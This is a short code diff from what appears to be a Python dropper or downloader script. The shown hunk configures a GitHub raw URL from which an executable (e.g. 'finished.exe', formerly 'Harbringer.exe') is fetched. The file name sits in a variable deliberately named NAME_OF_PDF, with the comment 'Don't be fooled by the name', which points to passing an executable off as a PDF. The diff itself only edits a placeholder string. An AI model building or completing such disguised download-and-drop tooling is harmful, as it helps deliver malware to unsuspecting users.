@@ -32,7 +32,7 @@ if __name__ == "__main__":
     # Replace this with the direct URL to your executable file on GitHub
     GITHUB_USERNAME = "Add you rgithub username here"
     NAME_OF_REPO = "Add the name of the github repository where you uploaded the software to"
-    NAME_OF_PDF = "Don't be fooled by the name, add the name of the software and its file extension here; ie: Harbringer.exe if you didnt change its name"
+    NAME_OF_PDF = "Don't be fooled by the name, add the name of the software and its file extension here; ie: finished.exe if you didnt change its name"
     github_url = f"https://raw.githubusercontent.com/{GITHUB_USERNAME}/{NAME_OF_REPO}/main/{NAME_OF_PDF}"
 
     # Optional: Replace this with the desired directory where the file will be saved
